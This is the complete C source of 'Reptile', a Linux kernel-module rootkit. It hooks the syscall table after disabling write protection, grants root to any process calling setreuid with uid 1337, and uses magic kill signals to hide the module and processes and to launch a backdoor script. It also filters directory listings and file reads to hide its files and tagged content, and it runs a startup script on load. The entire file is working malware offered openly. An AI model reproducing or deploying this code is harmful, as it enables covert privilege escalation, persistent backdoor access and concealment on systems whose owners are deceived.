/* REPTILE ROOTKIT
 *
 * A LKM Linux rootkit
 * Author: F0rb1dd3n
 *
 */

#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/file.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
	#include <linux/fdtable.h>
#endif

#define HEAVENSDOOR 	"/reptile/heavens_door"
#define START 		"/reptile/start.sh"
#define KILLDOOR 	"/reptile/kill_door.sh"
#define SIGKNOCK 	48
#define SIGHIDEPROC 	49
#define SIGHIDEREPTILE 	50
#define SIGHIDECONTENT  51
#define HIDE 		"reptile"
#define SSIZE_MAX 	32767
#define HIDETAGIN 	"#<reptile>"
#define HIDETAGOUT 	"#</reptile>"

int hidden = 0, knockon = 0, hide_file_content = 1;
static struct list_head *mod_list;
static unsigned long *sct;
atomic_t read_on;

asmlinkage int (*o_setreuid)(uid_t ruid, uid_t euid);
asmlinkage int (*o_kill)(pid_t pid, int sig);
asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t (*o_read)(int fd, void *buf, size_t nbytes);

asmlinkage int l33t_setreuid(uid_t reuid, uid_t euid);
asmlinkage int l33t_kill(pid_t pid, int sig);
asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes);

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

void hide(void) {
	if(hidden) return;

	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;  	
	hidden = 1;
}

void show(void) {
	if(!hidden) return;

	list_add(&THIS_MODULE->list, mod_list);
	hidden = 0;
}

struct task_struct *find_task(pid_t pid){
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int is_invisible(pid_t pid){
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & 0x10000000)
		return 1;
	return 0;
}

static int start_bin_from_userland(char *arg){
	char *argv[] = { arg, NULL, NULL};
	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

struct file *e_fget_light(unsigned int fd, int *fput_needed) {
    struct file *file;
    struct files_struct *files = current->files;

    *fput_needed = 0;
    if (likely((atomic_read(&files->count) == 1))) {
        file = fcheck(fd);
    } else {
        spin_lock(&files->file_lock);
        file = fcheck(fd);
        if (file) {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);
    }
    return file;
}

int f_check(void *arg, int size) {
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);

	buf = (char *) kmalloc(size+1, GFP_KERNEL);
	if(__copy_from_user((void *) buf, (void *) arg, size)) goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
		kfree(buf);
		return(1);
	}
out:
	kfree(buf);
	return(-1);
}

int hide_content(void *arg, int size) {
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *) kmalloc(size, GFP_KERNEL);
	if(__copy_from_user((void *) buf, (void *) arg, size)) {
		kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	i = size - (p2 - buf);
	memmove((void *) p1, (void *) p2, i);
	newret = size - (p2 - p1);

	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
		kfree(buf);
		return size;
	}
	kfree(buf);
	return newret;
}

unsigned long *find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

asmlinkage int l33t_setreuid(uid_t ruid, uid_t euid){

	int ret = 0;

    	if(ruid == 1337 && euid == 1337){
        	commit_creds(prepare_kernel_cred(0));
        	ret = o_setreuid(0, 0);
    	} else {
		ret = o_setreuid(ruid, euid);
	}
    	return ret;
}

asmlinkage int l33t_kill(pid_t pid, int sig){

	struct task_struct *task;

	switch(sig) {
		case SIGHIDEREPTILE:
			if(hidden) show();
			else hide();
			break;
		case SIGHIDEPROC:
			if((task = find_task(pid)) == NULL) return -ESRCH;

			task->flags ^= 0x10000000;
			break;
		case SIGKNOCK:
			if(knockon) {
				start_bin_from_userland(KILLDOOR);
				knockon = 0;
			} else {
				start_bin_from_userland(HEAVENSDOOR);
				knockon = 1;
			}
			break;
		case SIGHIDECONTENT:
			if(hide_file_content) hide_file_content = 0;
			else hide_file_content = 1;
			break;
		default:
			return o_kill(pid, sig);
	}
	return 0;
}

asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
	int ret = o_getdents64(fd, dirent, count); 
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdir, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0) return ret;

	kdir = kzalloc(ret, GFP_KERNEL);
	if (kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(HIDE, dir->d_name, strlen(HIDE)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:
	kfree(kdir);
	return ret;
}

asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	int ret = o_getdents(fd, dirent, count);
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	
	if (ret <= 0) return ret;	

	kdir = kzalloc(ret, GFP_KERNEL);
	if(kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if(d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(HIDE, dir->d_name, strlen(HIDE)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:	
	kfree(kdir);
	return ret;
}

asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
	struct file *f;
	int fput_needed;
	ssize_t ret;
       
	if(hide_file_content) {
		ret = -EBADF;

		atomic_set(&read_on, 1);
		f = e_fget_light(fd, &fput_needed);

		if (f) {
			ret = vfs_read(f, buf, nbytes, &f->f_pos);

			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
	    	
			fput_light(f, fput_needed);
		}
		atomic_set(&read_on, 0);
	} else {
		ret = o_read(fd, buf, nbytes);
	}

	return ret;
}

static int __init reptile_init(void) { 
	atomic_set(&read_on, 0);
	sct = (unsigned long *)find_sys_call_table();
	
	if(sct) {
    		o_setreuid = (void *)sct[__NR_setreuid];
    		o_kill = (void *)sct[__NR_kill];
    		o_getdents64 = (void *)sct[__NR_getdents64];
    		o_getdents = (void *)sct[__NR_getdents];
    		o_read = (void *)sct[__NR_read];
		
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_setreuid] = (unsigned long)l33t_setreuid;		
		sct[__NR_kill] = (unsigned long)l33t_kill;		
		sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
		sct[__NR_getdents] = (unsigned long)l33t_getdents;		
		sct[__NR_read] = (unsigned long)l33t_read;		
		write_cr0(read_cr0() | 0x10000);
	} else {
		return -1;
	}

	start_bin_from_userland(START);

	return 0; 
} 

static void __exit reptile_exit(void) { 
	if(o_setreuid){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_setreuid] = (unsigned long)o_setreuid;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_kill){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_kill] = (unsigned long)o_kill;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents64){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents64] = (unsigned long)o_getdents64;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents] = (unsigned long)o_getdents;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_read) {
		while(atomic_read(&read_on) != 0) schedule();
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_read] = (unsigned long)o_read;
		write_cr0(read_cr0() | 0x10000);
	}
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("F0rb1dd3n - ighor@intruder-security.com");
MODULE_DESCRIPTION("Reptile - A linux LKM rootkit");
